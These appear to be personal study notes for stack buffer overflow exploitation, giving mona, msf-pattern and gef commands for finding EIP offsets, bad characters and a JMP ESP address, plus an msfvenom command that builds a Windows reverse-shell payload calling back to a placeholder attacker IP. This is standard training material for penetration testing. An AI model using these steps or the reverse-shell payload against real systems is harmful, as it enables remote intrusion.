Ascii transfers over Netcat won't work use a python script.

https://shell-storm.org/shellcode/index.html

## Windows 
```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

fuzzbof.py
```bash
msf-pattern_create -l $int
```

enumeip.py
```powershell
!mona findmsp -distance $int
# Right Click -> Copy full line of EIP
```
No mona:
```bash
msf-pattern_offset -q $eip_address 
```

enumbadchars.py
```powershell
# use brain see CPU 
# address to which the ESP register point
!mona compare -f C:\mona\$bin\bytearray.bin -a $address
# Collect and deduce bad chars, remember corrupt to next byte so double check with updated enumbadchars.py
```

`!mona jmp -r esp -cpb "$badchars"`
If need to:
`ctrl + g` go to `$esp_address`
`f2` breakpoint on `$esp_address`
Step into  `F7`

`msfvenom -p windows/shell_reverse_tcp -a x$arch LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b $badchars -f py -v shellcode`


## Linux 
[guyinatuxedo](https://guyinatuxedo.github.io/index.html) [gef commands](https://hugsy.github.io/gef/commands/aliases/)

Dissemble 
`checksec`
`objdump -D $binary | grep -i $`
`gdb $binary`

```bash
gef> r # run binary
```
fuzzbof.py
```bash
gef> pattern create <size>
# copy and paste 
run <paste pattern at correct stage of the program>
# look at *sp register address 
gef> pattern search $string_in_rsp
# for stack bufferover flow note *ip register address 
info functions
# Check register
info register
x/100x $rsp
x/100x $rsp-$RECONINT
```



